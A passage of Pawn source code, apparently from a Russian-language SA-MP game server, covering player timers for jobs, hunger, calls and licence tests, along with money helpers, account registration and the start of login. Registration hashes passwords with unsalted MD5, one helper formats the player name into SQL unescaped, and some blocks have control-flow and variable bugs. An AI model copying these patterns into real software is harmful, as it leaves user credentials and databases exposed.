			if(GetPVarInt(i, "TimeBus") == 0)
			{
				DeletePVar(i, "TimeBus");
				new type = GetPVarInt(i, "TypeBus"), p = pPressed[i];
				SetPVarInt(i, "BusStop", 1);
				if(type == 1) SetPlayerRaceCheckpoint(i,0,BusCityLS[p][0],BusCityLS[p][1],BusCityLS[p][2],BusCityLS[p][3],BusCityLS[p][4],BusCityLS[p][5],5.0);
			}
		}
		if(EtherCalled[i] == true)
		{
			if(PI[i][pPhoneBalance] > CallPrice[PI[i][pNews]-1])
			{
				PI[i][pPhoneBalance] -= CallPrice[PI[i][pNews]-1];
				MysqlUpdatePlayerInt(i, "phonebalance", PI[i][pPhoneBalance]);
				if(PI[i][pNews]-1 == 0)
				{
					FracBank[8] += CallPrice[PI[i][pNews]-1];
					MysqlUpdateOtherInt("lsnbank", FracBank[8]);
				}
				if(PI[i][pNews]-1 == 1)
				{
					FracBank[9] += CallPrice[PI[i][pNews]-1];
					MysqlUpdateOtherInt("sfnbank", FracBank[9]);
				}
				if(PI[i][pNews]-1 == 2)
				{
					FracBank[10] += CallPrice[PI[i][pNews]-1];
					MysqlUpdateOtherInt("lvnbank", FracBank[10]);
				}
			}
			else
			{
				new callerid = Mobile[i];
				SendClientMessage(callerid, COLOR_GRAD2, "Абонент положил трубку");
				SetPlayerSpecialAction(callerid,SPECIAL_ACTION_STOPUSECELLPHONE);
				CellTime[callerid] = -1;
				CellTime[i] = -1;
				Mobile[callerid] = -1;
				if(EtherCalled[i] == true) EtherCalled[i] = false;
				if(EtherCalled[callerid] == true) EtherCalled[callerid] = false;
				SendClientMessage(i,  COLOR_GRAD2, "Недостаточно средств на счету...");
				Mobile[i] = -1;
				SetPlayerSpecialAction(i,SPECIAL_ACTION_STOPUSECELLPHONE);
			}
		}
		if(PI[i][pWanted] > 0)
		{
			PI[i][pWantedTime]--;
			if(PI[i][pWantedTime] <= 0)
			{
				PI[i][pWanted]--;
				SetPlayerWantedLevel(i, PI[i][pWanted]);
				if(PI[i][pWanted] > 0) PI[i][pWantedTime] = 1800 + random(300);
				MysqlUpdatePlayerInt(i, "wanted", PI[i][pWanted]);
				MysqlUpdatePlayerInt(i, "wantedtime", PI[i][pWantedTime]);
			}
		}
		if(!PI[i][pAdmin])
		{
			new speed = PlayerSpeed(i);
			if(!speed) SetPVarInt(i, "HungerTime", GetPVarInt(i, "HungerTime") + 1);
			else SetPVarInt(i, "HungerTime", GetPVarInt(i, "HungerTime") + speed/4);
			if(GetPVarInt(i, "HungerTime") == 250 && !PI[i][pVip])
			{
				SetPVarInt(i, "HungerTime", 0);
				if(PI[i][pVip]) PI[i][pHunger] -= 2;
				else PI[i][pHunger]--;
				SetHunger(i, PI[i][pHunger]);
				if(PI[i][pHunger] == 1 || PI[i][pHunger] == 5 || PI[i][pHunger] == 10 || PI[i][pHunger] == 15)
					SendClientMessage(i, COLOR_YELLOW,"Вы проголодались! Сходите в закусочную!");

				MysqlUpdatePlayerInt(i, "hunger", PI[i][pHunger]);
			}
			SetPVarInt(i, "HealthTime", GetPVarInt(i, "HealthTime") + 1);
			if(GetPVarInt(i, "HealthTime") == 60)
			{
				SetPVarInt(i, "HealthTime", 0);
				if(PI[i][pHunger] <= 0)
				{
					new Float:shealth;
					GetPlayerHealth(i, shealth);
					SetHealth(i, (PI[i][pImprove][0] == 1) ? (shealth-1.0) : (shealth-2.0));
				}
			}
			if(PI[i][pHeal] < 20)
			{
				SetPVarInt(i, "HealthTime_", GetPVarInt(i, "HealthTime_") + 1);
				if(GetPVarInt(i, "HealthTime_") == 600)
				{
					SetPVarInt(i, "HealthTime_", 0);
					SendClientMessage(i, COLOR_YELLOW, "У Вас сильно ухудшилось здоровье, вылечитесь у медика!");
				}
			}
		}
		if(GetPlayerDrunkLevel(i) > 0)
		{
			SetPVarInt(i, "DrunkTime", GetPVarInt(i, "DrunkTime") + 1);
			if(GetPVarInt(i, "DrunkTime") >= 100)
			{
				SetPlayerDrunkLevel(i, GetPlayerDrunkLevel(i) - 1000);
				SetPVarInt(i, "DrunkTime", 0);
			}
		}
		if(DrivingTestTime[i] > 0)
		{
			if(GetPlayerState(i) != 2)
			{
				DrivingTestTime[i]--;
				new string[12];
				format(string,12,"~r~%d",DrivingTestTime[i]);
				GameTextForPlayer(i, string, 2000, 6);
				if(DrivingTestTime[i] == 0)
				{
					SendClientMessage(i, COLOR_RED, "Время истекло, Вы провалили экзамен на управление наземным транспортом");
					DeletePVar(i, "DrivingTest");
					DeletePVar(i, "DrivingTestHealth");
					DeletePVar(i, "DrivingTestError");
				}
			}
		}
		if(FlyTestTime[i] > 0)
		{
			if(GetPlayerState(i) != 2)
			{
				FlyTestTime[i]--;
				new string[12];
				format(string,12,"~r~%d",FlyTestTime[i]);
				GameTextForPlayer(i, string, 2000, 6);
				if(FlyTestTime[i] == 0)
				{
					SendClientMessage(i, COLOR_RED, "Время истекло, Вы провалили экзамен на управление воздушным транспортом");
					DeletePVar(i, "FlyTest");
					DeletePVar(i, "FlyTestHealth");
					DeletePVar(i, "FlyTestError");
				}
			}
		}
		if(WaterTestTime[i] > 0)
		{
			if(GetPlayerState(i) != 2)
			{
				WaterTestTime[i]--;
				new string[12];
				format(string,12,"~r~%d",WaterTestTime[i]);
				GameTextForPlayer(i, string, 2000, 6);
				if(WaterTestTime[i] == 0)
				{
					SendClientMessage(i, COLOR_RED, "Время истекло, Вы провалили экзамен на управление водным транспортом");
					DeletePVar(i, "WaterTest");
					DeletePVar(i, "WaterTestTimeOn");
					DeletePVar(i, "WaterTestHealth");
					DeletePVar(i, "WaterTestError");
				}
			}
		}
		if(GetPlayerSurfingVehicleID(i) != INVALID_VEHICLE_ID)
		{
			new cid = GetPlayerSurfingVehicleID(i);
			new cm = GetVehicleModel(cid);
			switch(cm)
			{
				case 430,446,452,453,454,472,473,484,493,595,444: { return 1; }
				default: { }
			}
			new Float:x, Float:y, Float:z;
			GetPlayerPos(i, x, y, z);
			x -= 1.5;
			SetPlayerPos(i, x, y, z);
		}
		if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			new Float:vehhealth;
			GetVehicleHealth(GetPlayerVehicleID(i), vehhealth);
			if(vehhealth <= 400)
			{
				if(GetVehicleData(GetPlayerVehicleID(i), veh_engine) == true) SendClientMessage(i, COLOR_GREY, "Машина поломана, вызовите механика!");
				SetVehicleData(GetPlayerVehicleID(i), veh_engine, false);
				GetVehicleParamsEx(GetPlayerVehicleID(i),engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(GetPlayerVehicleID(i),false,lights,alarm,doors,bonnet,boot,objective);
			}
		}
		if(GetPVarInt(i, "BusTime") > 0)
		{
			if(GetPlayerState(i) != 2 || GetPlayerVehicleID(i) != PI[i][BusCarID])
			{
				new string[32];
				SetPVarInt(i, "BusTime", GetPVarInt(i, "BusTime") - 1);
				format(string, sizeof(string), "~r~%d",GetPVarInt(i, "BusTime"));
				GameTextForPlayer(i, string, 2000, 6);
				new CB[16];
				Convert(PI[i][pBusTime], CB);
				if(GetPVarInt(i, "BusTime") == 0)
				{
					if(IsValidDynamic3DTextLabel(BusText3D[i])) DestroyDynamic3DTextLabel(BusText3D[i]);
					SendMes(i, COLOR_BLUE, "Рабочий день завершен. Вами заработано: %iр. Время рейса: %s", GetPVarInt(i, "BusMoney"), CB);
					SendClientMessage(i, COLOR_WHITE, "Деньги будут перечислены на счет во время зарплаты");
					PI[i][pPayCheck] += GetPVarInt(i, "BusMoney");
					MysqlUpdatePlayerInt(i, "paycheck", PI[i][pPayCheck]);
					new id = PI[i][BusCarID];
					SetVehiclePos(id, g_vehicle[id][veh_x], g_vehicle[id][veh_y], g_vehicle[id][veh_z]);
					PI[i][BusCarID] = INVALID_VEHICLE_ID;
					DeletePVar(i, "BusTime");
					DeletePVar(i, "TypeBus");
					DeletePVar(i, "PriceBus");
					DeletePVar(i, "BusStop");
					DeletePVar(i, "BusMoney");
					PI[i][pBusTime] = 0;
					pPressed[i] = 0;
				}
			}
		}
		if(GetPVarInt(i, "RazgruzJob") > 0)//дальнобойщик Разгрузка
		{
			if(GetPlayerState(i) != 2)
			{
    			new string[10];
				SetPVarInt(i, "RazgruzJob", GetPVarInt(i, "RazgruzJob") - 1);
				format(string, sizeof(string), "~r~%d",GetPVarInt(i, "RazgruzJob"));
				GameTextForPlayer(i, string, 2000, 6);
				if(GetPVarInt(i, "RazgruzJob") == 0)
				{
     				TogglePlayerControllable(playerid,1);
					SendClientMessage(playerid, COLOR_BLUE,"Разгрузка фуры завершена...");
					SendClientMessage(playerid,-1,"Отправляйтесь на загрузку товара. Метка отмечена на GPS");
	    			DeletePVar(playerid, "RazgJob");
	    			DeletePVar(playerid, "RazgruzJob");
					g_player_skills[playerid][S_T_FLIGHTS] += 1;
					if(g_player_skills[playerid][S_T_FLIGHTS] == 30)
					{
					    g_player_skills[playerid][S_T_COUNT] += 1;
					    g_player_skills[playerid][S_T_FLIGHTS] = 0;
					}
					if(!doubling_donate)
					{
					    if(g_player_skills[playerid][S_T_COUNT] <= 1)
					    {
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 1500 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 1500);
			 			}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 2)
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 2800 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 2800);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 3 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 3200 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 3200);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 4 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 3600 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 3600);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 5 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 5800 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 5800);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 6 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 6400 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 6400);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 7 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 6600 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 6600);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 8 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 7000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 7000);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 9 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 8000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 8000);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 10 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 8900 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 8900);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] <= 15 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 9400 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 9400);
			    		}
			    		else if(g_player_skills[playerid][S_T_COUNT] <= 20 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 11500 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 11500);
			    		}
			    		else if(g_player_skills[playerid][S_T_COUNT] <= 35 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 15500 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 15500);
			    		}
			    		else if(g_player_skills[playerid][S_T_COUNT] <= 60 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 19000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 19000);
			    		}
			  			else if(g_player_skills[playerid][S_T_COUNT] >= 90 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 25000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 25000);
			    		}
					}
					else
					{
					    if(g_player_skills[playerid][S_T_COUNT] <= 1)
					    {
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 3000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 3000);
			 			}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 2)
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 5600 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 5600);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 3 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 6400 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 6400);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 4 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 7200 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 7200);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 5 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 11600 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 11600);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 6 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 12800 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 12800);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 7 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 13200 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 13200);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 8 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 14000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 14000);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 9 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 16000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 16000);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] == 10 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 17800 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 17800);
			    		}
			 			else if(g_player_skills[playerid][S_T_COUNT] <= 15 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 18800 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 18800);
			    		}
			    		else if(g_player_skills[playerid][S_T_COUNT] <= 20 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 23000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 23000);
			    		}
			    		else if(g_player_skills[playerid][S_T_COUNT] <= 35 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 26000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 26000);
			    		}
			    		else if(g_player_skills[playerid][S_T_COUNT] <= 60 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 38000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 38000);
			    		}
			  			else if(g_player_skills[playerid][S_T_COUNT] >= 90 )
			 			{
						    SendClientMessage(playerid, COLOR_BLUE, "Вы доставили груз и получили 50000 рублей");
						    SendClientMessage(playerid, COLOR_BLUE, "Уровень ваших умений повышен (/jskill)");
						    GiveMoney(playerid, 50000);
			    		}
					}
					new metka = random(4);
					switch(metka)
					{
					    case 0: {
					        SetPlayerCheckpoint(playerid, 1786.4874,2268.5398,15.7698,5.0);
							SetPVarInt(playerid, "MetkaJob", 1);
						}
						case 1: {
					        SetPlayerCheckpoint(playerid, -2451.6064,660.0789,5.3688,5.0);
							SetPVarInt(playerid, "MetkaJob", 2);
						}
						case 2: {
					        SetPlayerCheckpoint(playerid, -2488.6279,622.1194,5.3688,5.0);
					       	SetPVarInt(playerid, "MetkaJob", 3);
						}
						case 3: {
					        SetPlayerCheckpoint(playerid, 2738.2620,-2274.9829,17.9269,5.0);
					        SetPVarInt(playerid, "MetkaJob", 4);
						}
					}
					return true;
				}
			}
		}
		if(GetPVarInt(i, "ZagruzJob") > 0)//дальнобойщик
		{
			if(GetPlayerState(i) != 2)
			printf("debug:7");
			{
			    new string[10];
				SetPVarInt(i, "ZagruzJob", GetPVarInt(i, "ZagruzJob") - 1);
				format(string, sizeof(string), "~r~%d",GetPVarInt(i, "ZagruzJob"));
				GameTextForPlayer(i, string, 2000, 6);
				printf("debug:8");
				if(GetPVarInt(i, "ZagruzJob") == 0)
				{
  					TogglePlayerControllable(playerid,1);
					SendClientMessage(playerid, COLOR_BLUE,"Загрузка фуры завершена...");
					SendClientMessage(playerid,-1,"Отправляйтесь на разгрузку товара. Метка отмечена на GPS");
	    			DeletePVar(playerid, "MetkaJob");
					new rand = random(4);
					switch(rand)
					{
					    case 0: {
					        SetPlayerCheckpoint(playerid, 2466.8582,-649.5677,12.2153,5.0);
							SetPVarInt(playerid, "RazgJob", 1);
						}
						case 1: {
					        SetPlayerCheckpoint(playerid, 789.1042,529.2069,12.0085,5.0);
							SetPVarInt(playerid, "RazgJob", 2);
						}
						case 2: {
					        SetPlayerCheckpoint(playerid, 2320.2922,1736.8392,1.7617,5.0);
					       	SetPVarInt(playerid, "RazgJob", 3);
						}
						case 3: {
					        SetPlayerCheckpoint(playerid, -877.1223,1137.7087,10.5293,5.0);
					        SetPVarInt(playerid, "RazgJob", 4);
						}
					}
				}
			}
		}
		if(GetPVarInt(i, "TruckerJobTime") > 0)//дальнобойщик
		{
			if(GetPlayerState(i) != 2)
			{
			    new string[10];
				SetPVarInt(i, "TruckerJobTime", GetPVarInt(i, "TruckerJobTime") - 1);
				format(string, sizeof(string), "~r~%d",GetPVarInt(i, "TruckerJobTime"));
				GameTextForPlayer(i, string, 2000, 6);
				if(GetPVarInt(i, "TruckerJobTime") == 0)
				{
                    DestroyVehicleEx(TruckerCar[i]);
                    DestroyVehicleEx(PI[i][P_GRUZ_CAR]);
                    PI[i][TruckerCarID] = INVALID_VEHICLE_ID;
                    TruckerCar[i] = 0;
                    PI[i][P_GRUZ_CAR] = 0;
					SendClientMessage(i, COLOR_BLUE, "К сожалению, Вы не успели сесть в грузовик");
					DisablePlayerRaceCheckpoint(i);
					DeletePVar(i, "TruckerJobTime");
					DeletePVar(i, "TruckerJob");
					DeletePVar(i, "TruckerJobRazgruzka");
					DeletePVar(i, "TruckerJobFuel");
					pPressed[i] = 0;
				}
			}
		}
		if(GetPVarInt(i, "TruckerJobTimeGoToCar") > 0)//дальнобойщик
		{
			if(GetPlayerState(i) != 2)
			{
			    new string[10];
				SetPVarInt(i, "TruckerJobTimeGoToCar", GetPVarInt(i, "TruckerJobTimeGoToCar") - 1);
				format(string, sizeof(string), "~r~%d",GetPVarInt(i, "TruckerJobTimeGoToCar"));
				GameTextForPlayer(i, string, 2000, 6);
				if(GetPVarInt(i, "TruckerJobTimeGoToCar") == 0)
				{
                    DestroyVehicleEx(TruckerCar[i]);
                    DestroyVehicleEx(PI[i][P_GRUZ_CAR]);
                    PI[i][TruckerCarID] = INVALID_VEHICLE_ID;
                    TruckerCar[i] = 0;
                    PI[i][P_GRUZ_CAR] = 0;
                    DisablePlayerRaceCheckpoint(i);
					SendClientMessage(i, COLOR_RED, "К сожалению, Вы не успели сесть в грузовик");
					DeletePVar(i, "TruckerJobTime");
					DeletePVar(i, "TruckerJob");
					DeletePVar(i, "TruckerJobRazgruzka");
					DeletePVar(i, "TruckerJobFuel");
					DisablePlayerCheckpoint(i);
				}
			}
		}
		if(CellTime[i] > -1)
		{
			CellTime[i]++;
			if(Mobile[Mobile[i]] == -1 && CellTime[i] == 5)
			{
				CellTime[i] = 0;
				new string[64];
				format(string, sizeof(string), "У %s звонит мобильный телефон", GetName(Mobile[i]));
				ProxDetectorNew(Mobile[i], 13.0, COLOR_PURPLE, string);
			}
		}
		if(TransferReset[i] != -1) TransferReset[i]--;
		if(UnMaskReset[i] > 0) UnMaskReset[i]--;

		if(!IsPlayerConnected(i))
			return 1;

	}

	PI[i][pAFK]++;
	if(PI[i][pAFK] >= 3)
	{
		new temp[64];
		format(temp, sizeof(temp), "Игрок на паузе: %s", Converts(PI[i][pAFK]));
		SetPlayerChatBubble(i, temp, COLOR_YELLOW, 10.0, 1600);
	}

	return 1;
}

stock GiveBankMoney(playerid, money, reason[] = "None")
{
	#pragma unused reason
	PI[playerid][pBank] += (money);

	new fmt_query[80];

	format(fmt_query, sizeof fmt_query, "UPDATE accounts SET bank=%d WHERE name='%s'", PI[playerid][pBank], GetName(playerid));
	mysql_query(dbHandle, fmt_query);

	return 1;
}

stock TransferMoney(playerid, toplayerid, money)
{
    if(GetPlayerMoney(playerid) < 0) ResetPlayerMoney(playerid);
	if(GetPlayerMoney(toplayerid) < 0) ResetPlayerMoney(toplayerid);
	if(toplayerid >= 0)
	{
	    GiveMoney(toplayerid, money);
		CheckOutMoney[toplayerid] = true;

	}
	if(playerid >= 0)
	{
		GiveMoney(playerid, -money);
		CheckOutMoney[playerid] = true;
	}

	MysqlUpdatePlayerInt(playerid, "cash", PI[playerid][pCash]);
	MysqlUpdatePlayerInt(toplayerid, "cash", PI[toplayerid][pCash]);
}

stock ResetMoney(playerid)
{
	PI[playerid][pCash] = 0;
	ResetPlayerMoney(playerid);

	MysqlUpdatePlayerInt(playerid, "cash", PI[playerid][pCash]);
}

stock GetMoney(playerid)
{
	return PI[playerid][pCash];
}

stock PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
	return 0;
}

stock ATMList(playerid)
{
	ShowPlayerDialog(playerid, D_ATM+932, 2, "{FFCC00}Банкомат", "{FFCC00}1. {ffffff}Баланс\n{FFCC00}2. {ffffff}Положить деньги\n{FFCC00}3. {ffffff}Снять деньги\n{FFCC00}4. {ffffff}Оплатить дом\n{FFCC00}5. {ffffff}Пополнить счет мобильного телефона", "Выбрать", "Отмена");
	return 1;
}

stock CreateAccount(playerid, password[])
{
    if(PlayerRegistered[playerid] == 0) return SKick(playerid, 2112);
    new pass[50];
    mysql_escape_string(password, pass, dbHandle);
	if(IsTextInvalid(pass))
	{
		SendClientMessage(playerid, COLOR_RED, "В пароле должны быть только буквы и цифры");
		return Kick(playerid);
	}
	new data[15];
	format(data, sizeof(data), "%s", date("%dd.%mm.%yyyy",gettime()));
	new Info[300];

	new Cache: result;

	STRING_GLOBAL[0] = EOS;
	strcat(STRING_GLOBAL, "INSERT INTO "T_ACCOUNTS" ");
	strcat(STRING_GLOBAL, "(`name`, `password`, `regip`, `datareg`, `sex`, `age`, `model`, `mail`, `referal`) ");
	strcat(STRING_GLOBAL, "VALUES ");
	format(Info, sizeof(Info), "('%s', MD5('%s'), '%s', '%s', '%i', '%i', '%i', '%s', '%s')",
	GetName(playerid), pass, PI[playerid][pIP], data, PI[playerid][pSex], PI[playerid][pAge], PI[playerid][pModel], PI[playerid][pMail], PI[playerid][pReferal]);
	strcat(STRING_GLOBAL, Info);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	PI[playerid][pID] = cache_insert_id();
	cache_delete(result);

	PlayerLogged[playerid] = true;
	PlayerRegistered[playerid] = 0;
	PI[playerid][pLevel] = 1;
	MysqlUpdatePlayerInt(playerid, "level", PI[playerid][pLevel]);

	GiveMoney(playerid, 5000000);

	PI[playerid][pBank] = 0;
	PI[playerid][pSprunk] = 7000;
	Settings[playerid][5] = 1;
	SetHunger(playerid, PI[playerid][pHunger]);
	Conday[2]++;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"SELECT * FROM "T_INVENT" WHERE `Name` = '%s'", GetName(playerid));
	mysql_tquery(dbHandle, STRING_GLOBAL, "LoadPlayerItem","d", playerid);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"INSERT INTO accounts_skills (owner) VALUES ('%d')", PI[playerid][pID]);
	mysql_tquery(dbHandle, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof(STRING_GLOBAL),"[A] Приветствуем нового игрока - {0CACE3}%s[%d]", GetName(playerid),playerid);
	SendAdminMessage(COLOR_WHITE, STRING_GLOBAL);

	new hour,
		minute,
		second,
		real_time[14];

	gettime(hour, minute, second);

	switch(hour)
	{
		case 4..12: real_time = "Доброе утро";
		case 13..16: real_time = "Добрый день";
		case 17..23: real_time = "Добрый вечер";
		case 0..3: real_time = "Доброй ночи";
	}

	STRING_GLOBAL[0] = EOS;

	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s, {37c268}%s {FFFFFF}Вы успешно зарегистрировали новый аккаунт на {37c268}HOME ONLINE", real_time, GetName(playerid));
	SendClientMessage(playerid, -1, STRING_GLOBAL);

	if(doubling_donate)
	{
		SendClientMessage(playerid, COLOR_MANDARIN, "На сервере активирован x2 день.");
		SendClientMessage(playerid, COLOR_MANDARIN, "Это значит, что зарплата во фракциях, на работах");
		SendClientMessage(playerid, COLOR_MANDARIN, "конвертация валюты (/donate), начисляется в 2 раза больше.");
	}

	SendClientMessage(playerid, -1, "Рекомендуем Вам усилить безопасность аккаунта в настройках. В противном случае Мы не сможем его восстановить! {37c268}/menu > Безопастность");

	ShowPlayerDialog
	(
		playerid, D_NULL, DIALOG_STYLE_MSGBOX,
		"{ffd83d}Информация",
		!"{ffffff}Вы успешно зарегистрировали новый аккаунт на {37c268}HOME ONLINE\n\n"\
		"{ffffff}Для лучшего старта советуем пройти начальную линию квестов,\n"\
		"она поможет Вам лучше освоить основы сервера, и заработать начальные деньги\n"\
		"{ffffff}Советуем ознакомиться с меню сервера {37c268}(/menu)\n\n"\
		"{ffffff}Там Вы сможете ознакомиться с командами сервера, а так же посмотреть статистику персонажа\n"\
		"{ffffff}Появились вопросы? Задайте их администрации сервера {37c268}/menu > Связь с Администрацией\n\n"\
		"{ffffff}Желаем Вам приятной игры на {37c268}HOME ONLINE",
		"Закрыть", ""
	);

	TogglePlayerSpectating(playerid, false);
	SpawnPlayer(playerid);
	return 1;
}

forward OnPlayerLogin(playerid, tmp[]);
public OnPlayerLogin(playerid, tmp[])
{
	if(!GetPVarInt(playerid, "Logged")) return 1;
	new rows, fields;
	cache_get_data(rows, fields);
	if(!rows)
	{
		PlayerLogTries[playerid]++;
		if(PlayerLogTries[playerid] == 4)
		{
			SendClientMessage(playerid,COLOR_RED, "Вы несколько раз ввели неверный пароль! Для выхода из игры введите: {ffffff}/q(uit)");
			return SKick(playerid, 52);
		}
        new string[100];
		format(string, sizeof(string), "{FFFFFF}Вы ввели неверный пароль!\nУ Вас осталось %d попыток", 3 - PlayerLogTries[playerid]);
		ShowPlayerDialog(playerid, D_ERRORPAS, DIALOG_STYLE_MSGBOX, "Ошибка", string, "Повтор", "Выйти");
		return 1;
	}

	StopAudioStreamForPlayer(playerid);

	DeletePVar(playerid, "show_auth");
	DeletePVar(playerid, "show_reg");

	PI[playerid][pID] = cache_get_row_int(0, 0, dbHandle); // id
	//cache_get_row(0, 2, PI[playerid][pPassword], dbHandle, 32); // password
